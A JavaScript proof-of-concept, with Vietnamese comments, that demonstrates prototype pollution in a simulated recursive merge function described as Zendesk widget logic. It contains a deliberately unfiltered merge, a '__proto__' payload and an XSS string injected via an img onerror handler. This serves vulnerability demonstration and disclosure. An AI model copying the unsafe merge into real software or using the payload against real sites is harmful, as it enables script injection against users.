
/**
 * PoC: Prototype Pollution in Zendesk Widget Logic (Final Verified)
 * Target: Simulated vulnerable merge function 'R' in z2-messaging-widget.js
 */

function R(target, source) {
    for (let key in source) {
        // Lỗ hổng: Gộp đệ quy mà không lọc các thuộc tính nhạy cảm
        if (target[key] && typeof target[key] === 'object' && typeof source[key] === 'object') {
            R(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Gadget: Một cấu hình toàn cục không định nghĩa trực tiếp một số thuộc tính
// nhưng lại sử dụng chúng trong quá trình thực thi (ví dụ: template, callback)
const widgetRenderOptions = {
    theme: "dark"
    // missing: xssPayloadProperty
};

console.log("--- Phân tích Bề mặt Tấn công ---");
console.log("Option 'xssPayloadProperty' ban đầu:", widgetRenderOptions.xssPayloadProperty);

// Tấn công: Payload độc hại được thiết kế để ô nhiễm Object.prototype
// Thông qua việc gộp vào một đối tượng trống có prototype là Object.prototype
const maliciousPayload = {
    ["__proto__"]: {
        xssPayloadProperty: "<img src=x onerror=alert('0xbc000349_Proto_Pollution')>"
    }
};

const userMetadata = {}; // Sink nhận dữ liệu từ người dùng

console.log("\n[!] Đang thực thi hành động gộp dữ liệu độc hại...");
R(userMetadata, maliciousPayload);

console.log("\n--- Kết quả sau khi khai thác ---");
console.log("Option 'xssPayloadProperty' của Widget (Bị ô nhiễm):", widgetRenderOptions.xssPayloadProperty);

if (widgetRenderOptions.xssPayloadProperty && widgetRenderOptions.xssPayloadProperty.includes("alert")) {
    console.log("\n[!!!] KHAI THÁC THÀNH CÔNG: Két sắt đã bị mở khóa!");
    console.log("Lỗ hổng Prototype Pollution đã cho phép kẻ tấn công chèn thuộc tính vào mọi đối tượng.");
    console.log("Mọi thành phần UI sử dụng 'xssPayloadProperty' từ cấu hình sẽ thực thi mã độc.");
} else {
    console.log("\n[-] Khai thác thất bại trong môi trường này.");
}
